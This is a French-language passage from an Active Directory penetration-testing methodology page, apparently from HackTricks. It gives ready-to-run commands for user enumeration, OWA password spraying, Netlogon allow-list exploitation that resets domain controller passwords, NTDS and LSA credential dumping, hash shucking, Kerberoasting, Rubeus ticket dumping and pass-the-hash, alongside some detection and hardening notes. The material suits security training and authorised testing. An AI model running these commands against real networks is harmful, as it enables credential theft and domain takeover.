# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

**Active Directory** constitue une technologie fondamentale permettant aux **administrateurs réseau** de créer et de gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d'un réseau. Il est conçu pour évoluer, en facilitant l'organisation d'un grand nombre d'utilisateurs en **groupes** et **sous-groupes** faciles à gérer, tout en contrôlant les **droits d'accès** à différents niveaux.

La structure d'**Active Directory** se compose de trois couches principales : les **domaines**, les **arbres** et les **forêts**. Un **domaine** regroupe des objets, tels que des **utilisateurs** ou des **appareils**, qui partagent une base de données commune. Les **arbres** sont des groupes de domaines liés par une structure commune, tandis qu'une **forêt** représente un ensemble de plusieurs arbres interconnectés par des **relations d'approbation**, formant la couche supérieure de la structure organisationnelle. Des **droits d'accès** et de **communication** spécifiques peuvent être attribués à chacun de ces niveaux.

Les concepts clés d'**Active Directory** comprennent :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne les entités présentes dans l'annuaire, notamment les **utilisateurs**, les **groupes** ou les **dossiers partagés**.
3. **Domain** – Sert de conteneur pour les objets de l'annuaire ; plusieurs domaines peuvent coexister au sein d'une **forêt**, chacun conservant sa propre collection d'objets.
4. **Tree** – Regroupement de domaines qui partagent un domaine racine commun.
5. **Forest** – Sommet de la structure organisationnelle d'Active Directory, composé de plusieurs arbres entre lesquels existent des **relations d'approbation**.

**Active Directory Domain Services (AD DS)** regroupe différents services essentiels à la gestion centralisée et à la communication au sein d'un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **utilisateurs** et les **domaines**, notamment les fonctionnalités d'**authentification** et de **recherche**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion de **certificats numériques** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications compatibles avec les annuaires via le **protocole LDAP**.
4. **Directory Federation Services** – Fournit des fonctionnalités de **single-sign-on** pour authentifier les utilisateurs sur plusieurs applications web au cours d'une seule session.
5. **Rights Management** – Aide à protéger les contenus protégés par le droit d'auteur en régulant leur distribution et leur utilisation non autorisées.
6. **DNS Service** – Essentiel à la résolution des **noms de domaine**.

Pour une explication plus détaillée, consultez : [**TechTerms - Définition d'Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Pour apprendre à **attaquer un AD**, vous devez très bien **comprendre** le **processus d'authentification Kerberos**.\
[**Consultez cette page si vous ne savez toujours pas comment il fonctionne.**](kerberos-authentication.md)

## Cheat Sheet

Vous pouvez consulter [https://wadcoms.github.io/](https://wadcoms.github.io) pour obtenir un aperçu rapide des commandes que vous pouvez exécuter afin d'énumérer/exploiter un AD.

> [!WARNING]
> La communication Kerberos **nécessite normalement un nom de domaine pleinement qualifié (FQDN)** afin que le client puisse obtenir un ticket correspondant au SPN correct. L'accès à une machine par adresse IP utilise généralement NTLM au lieu de Kerberos.

## Recon Active Directory (No creds/sessions)

Si vous avez uniquement accès à un environnement AD, mais ne disposez d'aucun identifiant ni d'aucune session, vous pouvez :

- **Pentester le réseau :**
- Scanner le réseau, trouver les machines et les ports ouverts, puis tenter d'**exploiter les vulnérabilités** ou d'**extraire des identifiants** de ces machines (par exemple, [les imprimantes peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
- L'énumération DNS peut fournir des informations sur les serveurs clés du domaine, tels que les serveurs web, les imprimantes, les partages, les VPN, les médias, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consultez la [**méthodologie de Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) générale pour obtenir davantage d'informations sur la manière de procéder.
- **Vérifier l'accès null et Guest aux services SMB** (cela ne fonctionnera pas sur les versions modernes de Windows) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur l'énumération d'un serveur SMB est disponible ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Énumérer LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur l'énumération de LDAP est disponible ici (accordez une **attention particulière à l'accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Empoisonner le réseau**
- Collecter des identifiants en [**usurpant des services avec Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accéder à l'hôte en [**abusant de l'attaque par relais**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Collecter des identifiants en **exposant** de [**faux services UPnP avec evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
- Extraire les noms d'utilisateur/noms à partir de documents internes, des réseaux sociaux et des services (principalement web) présents dans les environnements du domaine, ainsi que des informations accessibles publiquement.
- Si vous trouvez les noms complets des employés d'une entreprise, vous pouvez essayer différentes **conventions de noms d'utilisateur AD (**[**consultez ceci**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque nom), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
- Outils :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Énumération des utilisateurs

- **Énumération SMB/LDAP anonyme :** consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Énumération avec Kerbrute** : lorsqu'un **nom d'utilisateur invalide est demandé**, le serveur répond avec le code d'**erreur Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le nom d'utilisateur est invalide. Les **noms d'utilisateur valides** provoqueront soit la réception du **TGT** dans une réponse AS-REP, soit l'erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l'utilisateur doit effectuer une pré-authentification.
- **Aucune authentification avec MS-NRPC** : utiliser auth-level = 1 (aucune authentification) contre l'interface MS-NRPC (Netlogon) des contrôleurs de domaine. La méthode appelle la fonction `DsrGetDcNameEx2` après la liaison à l'interface MS-NRPC afin de vérifier si l'utilisateur ou l'ordinateur existe sans aucun identifiant. L'outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d'énumération. La recherche est disponible [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous avez trouvé l'un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération des utilisateurs contre celui-ci**. Par exemple, vous pouvez utiliser l'outil [**MailSniper**](https://github.com/dafthack/MailSniper) :
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Vous pouvez trouver des listes de noms d'utilisateur dans [**ce dépôt github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez avoir **le nom des personnes travaillant dans l'entreprise** grâce à l'étape de reconnaissance que vous auriez dû effectuer auparavant. Avec le prénom et le nom, vous pourriez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiellement valides.

### Abus de la liste d'autorisation des canaux vulnérables Netlogon (Onelogon)

Même après l'application du correctif **Zerologon** sur le DC, les comptes explicitement ajoutés à la liste d'autorisation peuvent toujours être exposés au **legacy/vulnerable Netlogon secure-channel behavior**. La configuration à risque est la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou la valeur de registre correspondante **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Cette valeur est un **descripteur de sécurité SDDL** (voir [Security Descriptors](security-descriptors.md)). Tout compte ou groupe auquel l'ACE correspondante est accordée dans la DACL peut être ciblé. Par exemple, `O:BAG:BAD:(A;;RC;;;WD)` ajoute effectivement **Everyone** à la liste d'autorisation.

Workflow pratique de l'opérateur :

1. **Identifier les principaux ajoutés à la liste d'autorisation** en vérifiant à la fois **SYSVOL/GPO** et le **registre du DC actif**.
2. **Résoudre les SID** trouvés dans le SDDL en utilisateurs/ordinateurs AD réels et donner la priorité aux **comptes machines des DC**, aux **comptes de confiance** et aux autres machines privilégiées.
3. Tenter de manière répétée une **authentification MS-NRPC / Netlogon** avec le compte ajouté à la liste d'autorisation.
4. Après une supposition réussie, exploiter la **définition du mot de passe Netlogon** pour réinitialiser le mot de passe du compte cible (le PoC public le définit sur une chaîne vide).<sup>[[9]](#references)[[10]](#references)</sup>

Exemples rapides de triage / lab provenant de l'artefact public :
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes :

- Le **scanner** est utile, car l'allow-list effective peut se trouver dans **SYSVOL**, dans le **registry**, ou dans les deux.
- Le chemin d'exploitation lui-même est important, car il **ne nécessite pas de privilèges Domain Admin** une fois qu'un compte vulnérable a été identifié.
- Compromettre un **compte machine de Domain Controller**, tel que `DC$`, est particulièrement dangereux, car la réinitialisation de ce mot de passe peut directement permettre des chemins plus larges d'**AD takeover**.
- La faisabilité du **brute-force** dépend du mode : l'artifact public décrit une approche meet-in-the-middle, un **brute force de 24 bits** lorsqu'un autre compte machine est disponible, ainsi que des variantes **32 bits** plus lentes.

Notes de détection / hardening :

- Auditez la politique d'allow-list et supprimez tout ce qui n'est pas une exception de compatibilité temporaire et explicitement requise.
- Surveillez les événements **System** **5827/5828/5829/5830/5831** des DC afin de détecter les connexions Netlogon vulnérables refusées, découvertes ou explicitement autorisées par la politique.
- Considérez les comptes présents dans `VulnerableChannelAllowList` comme présentant un **risque élevé** jusqu'à la suppression de la dépendance legacy.

### Connaître un ou plusieurs noms d'utilisateur

Bon, vous savez donc déjà que vous disposez d'un nom d'utilisateur valide, mais d'aucun mot de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md) : Si un utilisateur **ne possède pas** l'attribut _DONT_REQ_PREAUTH_, vous pouvez **demander un message AS_REP** pour cet utilisateur. Celui-ci contiendra des données chiffrées à partir d'une dérivation du mot de passe de l'utilisateur.
- [**Password Spraying**](password-spraying.md) : Essayons les mots de passe les plus **courants** avec chacun des utilisateurs découverts ; un utilisateur utilise peut-être un mauvais mot de passe (gardez à l'esprit la politique de mots de passe !).
- Notez que vous pouvez également effectuer du **spraying sur des serveurs OWA** afin d'essayer d'accéder aux serveurs de messagerie des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez être en mesure d'**obtenir** certains **hashes** de challenge en effectuant du **poisoning** sur certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

L'énumération d'Active Directory fournit les noms d'utilisateur, les identifiants d'e-mail et les modèles de nommage, les hôtes candidats ainsi que les services susceptibles d'être contraints à s'authentifier. Utilisez ce contexte pour identifier les [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM viables et les chemins potentiels vers l'environnement AD.

### Recon pilotée par les workspaces NetExec et vérifications de posture relay

- Utilisez les **workspaces `nxcdb`** pour conserver l'état de la recon AD par engagement : `workspace create <name>` crée des bases SQLite par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez de vue avec `proto smb|mssql|winrm` et listez les secrets collectés avec `creds`. Supprimez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La découverte rapide de sous-réseaux avec **`netexec smb <cidr>`** révèle le **domaine**, le **build de l'OS**, les **exigences de signature SMB** et le **Null Auth**. Les membres affichant `(signing:False)` sont **vulnérables au relay**, tandis que les DC exigent souvent la signature.
- Générez directement les **hostnames dans /etc/hosts** à partir de la sortie de NetExec afin de faciliter le ciblage :
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Lorsque le **SMB relay vers le DC est bloqué** par la signature, sondez tout de même la configuration **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / une faible channel binding. Un DC exigeant la signature SMB mais dont la signature LDAP est désactivée reste une cible viable de **relay-to-LDAP** pour des abus tels que **SPN-less RBCD**.

### Fuites de credentials d’imprimante côté client → validation en masse des credentials du domaine

- Les interfaces d’imprimantes/web intègrent parfois des **mots de passe administrateur masqués dans le HTML**. L’affichage de la source ou l’utilisation des outils de développement peut révéler le texte en clair (par ex. : `<input value="<password>">`), permettant un accès Basic-auth aux référentiels de scan/impression.
- Les travaux d’impression récupérés peuvent contenir des **documents d’onboarding en texte clair** avec des mots de passe propres à chaque utilisateur. Conservez les associations lors des tests :<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PC ou partages** avec l'**utilisateur null ou guest**, vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont consultés d'une manière ou d'une autre, **déclencheront une authentification NTLM contre vous**, afin que vous puissiez **voler** le **challenge NTLM** pour le cracker :

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Le **Hash shucking** traite chaque hash NT que vous possédez déjà comme un mot de passe candidat pour d'autres formats plus lents dont le matériel de clé est dérivé directement du hash NT. Au lieu de brute-forcer de longues passphrases dans les tickets Kerberos RC4, les challenges NetNTLM ou les credentials mis en cache, vous fournissez les hash NT aux modes NT-candidate de Hashcat et le laissez valider la réutilisation du mot de passe sans jamais connaître le texte en clair. Cette technique est particulièrement efficace après une compromission de domaine, lorsque vous pouvez récupérer des milliers de hash NT actuels et historiques.<sup>[[5]](#references)</sup>

Utilisez le shucking lorsque :

- Vous disposez d'un corpus NT provenant de DCSync, de dumps SAM/SECURITY ou de coffres de credentials, et que vous devez tester leur réutilisation dans d'autres domaines/forêts.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM ou des blobs DCC/DCC2.
- Vous souhaitez prouver rapidement la réutilisation de passphrases longues et impossibles à cracker, puis pivoter immédiatement via Pass-the-Hash.

La technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne correspondent pas au hash NT (par exemple, Kerberos etype 17/18 AES). Si un domaine impose AES uniquement, vous devez revenir aux modes de mots de passe classiques.

#### Création d'un corpus de hash NT

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l'historique pour récupérer le plus grand ensemble possible de hash NT (ainsi que leurs valeurs précédentes) :

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Les entrées historiques élargissent considérablement l'ensemble des candidats, car Microsoft peut stocker jusqu'à 24 hash précédents par compte. Pour découvrir d'autres moyens de récupérer les secrets NTDS, consultez :

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps du cache des endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données SAM/SECURITY locales et les logons de domaine mis en cache (DCC/DCC2). Dédupliquez ces hash et ajoutez-les à la même liste `nt_candidates.txt`.
- **Suivez les métadonnées** – Conservez le nom d'utilisateur/domaine à l'origine de chaque hash (même si la wordlist ne contient que des valeurs hexadécimales). Les hash correspondants vous indiquent immédiatement quel principal réutilise un mot de passe lorsque Hashcat affiche le candidat gagnant.
- Préférez les candidats provenant de la même forêt ou d'une forêt de confiance ; cela maximise les chances de chevauchement lors du shucking.

#### Modes NT-candidate de Hashcat

| Type de hash                             | Mode mot de passe | Mode NT-candidate |
| ---------------------------------------- | ----------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100              | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100              | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500              | 27000             |
| NetNTLMv2                                | 5600              | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500              | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100             | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200             | 35400             |

Remarques :

- Les entrées NT-candidate **doivent rester des hash NT bruts de 32 caractères hexadécimaux**. Désactivez les rule engines (pas de `-r`, pas de modes hybrides), car le mangling corromprait le matériel de clé candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l'espace de recherche NTLM (~30 000 MH/s sur un M3 Max) est environ 100 fois plus rapide que celui de Kerberos RC4 (~300 MH/s). Tester une liste NT ciblée coûte bien moins cher que d'explorer tout l'espace des mots de passe dans le format lent.
- Utilisez toujours la **dernière build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), car les modes 31500/31600/35300/35400 ont été intégrés récemment.<sup>[[7]](#references)</sup>
- Il n'existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le mot de passe en clair, car leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, et non de hash NT bruts.

#### Exemple – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur faiblement privilégié (consultez la page Kerberoast pour plus de détails) :

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Effectuez le shucking du ticket avec votre liste NT :

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l'un de vos hash NT existants.

3. Pivotez immédiatement via PtH :

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Vous pouvez éventuellement récupérer le texte en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Exemple – Credentials mis en cache (mode 31600)

1. Extrayez les logons mis en cache d'une workstation compromise :

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copiez la ligne DCC2 de l'utilisateur du domaine intéressant dans `dcc2_highpriv.txt`, puis effectuez le shucking :

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Une correspondance réussie fournit le hash NT déjà connu dans votre liste, prouvant que l'utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour le PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le dans le mode NTLM rapide pour récupérer la chaîne.

Le même workflow s'applique exactement aux challenge-responses NetNTLM (`-m 27000/27100`) et au DCC (`-m 31500`). Une fois la correspondance identifiée, vous pouvez lancer un relay, effectuer du PtH via SMB/WMI/WinRM ou recracker le hash NT avec des masks/rules hors ligne.



## Énumération d'Active Directory AVEC credentials/session

Pour cette phase, vous devez avoir **compromis les credentials ou une session d'un compte de domaine valide.** Si vous disposez de credentials valides ou d'un shell en tant qu'utilisateur du domaine, **vous devez vous rappeler que les options présentées précédemment restent des options pour compromettre d'autres utilisateurs**.

Avant de commencer l'énumération authentifiée, comprenez le **problème du double-hop Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

La compromission d'un compte constitue une **étape majeure pour évaluer le domaine**, car elle permet l'**énumération authentifiée d'Active Directory** :

Concernant [**ASREPRoast**](asreproast.md), vous pouvez désormais trouver chaque utilisateur vulnérable possible ; et concernant le [**Password Spraying**](password-spraying.md), vous pouvez obtenir une **liste de tous les noms d'utilisateur** et essayer le mot de passe du compte compromis, les mots de passe vides ainsi que les nouveaux mots de passe prometteurs.

- Vous pouvez utiliser la [**CMD pour effectuer une reconnaissance de base**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez également utiliser [**powershell pour la reconnaissance**](../basic-powershell-for-pentesters/index.html), ce qui sera plus furtif
- Vous pouvez aussi [**utiliser powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil remarquable pour la reconnaissance dans un active directory est [**BloodHound**](bloodhound.md). Il est **peu furtif** (selon les méthodes de collecte utilisées), mais **si cela ne vous dérange pas**, vous devriez absolument l'essayer. Trouvez où les utilisateurs peuvent se connecter en RDP, trouvez les chemins vers d'autres groupes, etc.
- **Les autres outils automatisés d'énumération AD sont :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Les [**enregistrements DNS de l'AD**](ad-dns-records.md), car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer l'annuaire est **AdExplorer.exe**, inclus dans la suite **SysInternal**.
- Vous pouvez également effectuer des recherches dans la base de données LDAP avec **ldapsearch** afin de rechercher des credentials dans les champs _userPassword_ et _unixUserPassword_, ou même dans _Description_. Consultez [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pouvez également énumérer le domaine avec [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez également essayer des outils automatisés tels que :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraire tous les utilisateurs du domaine**

Il est très facile d'obtenir tous les noms d'utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Énumération semble courte, il s'agit de la partie la plus importante de tout le processus. Consultez les liens (principalement ceux concernant cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à être à l'aise. Lors d'une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou décider que rien ne peut être fait.

### Kerberoast

Le Kerberoasting consiste à obtenir des **tickets TGS** utilisés par des services associés à des comptes utilisateur et à cracker leur chiffrement — qui repose sur les mots de passe des utilisateurs — **hors ligne**.

Plus d'informations à ce sujet dans :


{{#ref}}
kerberoast.md
{{#endref}}

### Connexion à distance (RDP, SSH, FTP, Win-RM, etc.)

Une fois que vous avez obtenu des credentials, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** afin de tenter de vous connecter à plusieurs serveurs avec différents protocoles, en fonction des scans de ports effectués.

### Élévation de privilèges locale

Si vous avez compromis des credentials ou une session en tant qu'utilisateur de domaine standard et que vous pouvez accéder à **n'importe quelle machine du domaine**, recherchez un chemin pour **élever vos privilèges localement et récupérer des credentials**. Les privilèges d'administrateur local peuvent vous permettre de **dumper les hash d'autres utilisateurs** depuis la mémoire (LSASS) et le stockage local (SAM).

Ce livre contient une page complète sur l'[**élévation de privilèges locale sous Windows**](../windows-local-privilege-escalation/index.html) ainsi qu'une [**checklist**](../checklist-windows-privilege-escalation.md). N'oubliez pas non plus d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la session actuelle

Il est très **peu probable** que vous trouviez des **tickets** dans l'utilisateur actuel qui vous **donnent la permission d'accéder** à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Avec des identifiants de domaine ou une session utilisateur, réexaminez les [**attaques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) : les techniques d'énumération authentifiée et de coercition peuvent révéler des chemins de relay qui n'étaient pas disponibles lors de la reconnaissance non authentifiée.

### Recherche de creds dans les partages des ordinateurs | Partages SMB

Maintenant que vous disposez de quelques identifiants de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés au sein de l'AD**. Vous pouvez le faire manuellement, mais il s'agit d'une tâche très fastidieuse et répétitive (d'autant plus si vous trouvez des centaines de documents à vérifier).

[**Suivez ce lien pour découvrir les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Vol de creds NTLM

Si vous pouvez **accéder à d'autres PC ou partages**, vous pouvez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont consultés d'une manière ou d'une autre, **déclencheront une authentification NTLM contre vous**, afin que vous puissiez **voler** le **challenge NTLM** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Élévation de privilèges sur Active Directory AVEC des identifiants/sessions privilégiés

**Pour les techniques suivantes, un utilisateur de domaine standard ne suffit pas : vous avez besoin de privilèges/identifiants spéciaux pour effectuer ces attaques.**

### Extraction de hashes

Avec un peu de chance, vous avez réussi à **compromettre** un compte d'**administrateur local** à l'aide d'[AsRepRoast](asreproast.md), du [Password Spraying](password-spraying.md), de [Kerberoast](kerberoast.md), de [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), y compris le relay, d'[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) ou de l'[élévation de privilèges en local](../windows-local-privilege-escalation/index.html).\
Il est alors temps d'extraire tous les hashes présents en mémoire et localement.\
[**Consultez cette page pour découvrir différentes façons d'obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **vous faire passer pour lui**.\
Vous devez utiliser un **outil** qui **effectuera** l'**authentification NTLM à l'aide de** ce **hash**, **ou** vous pouvez créer une nouvelle **sessionlogon** et **injecter** ce **hash** dans **LSASS**, afin que, lorsqu'une **authentification NTLM est effectuée**, ce **hash soit utilisé**. C'est la dernière option qu'utilise mimikatz.\
[**Consultez cette page pour plus d'informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash classique via le protocole NTLM. Elle peut donc être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** comme protocole d'authentification.


{{#ref}}
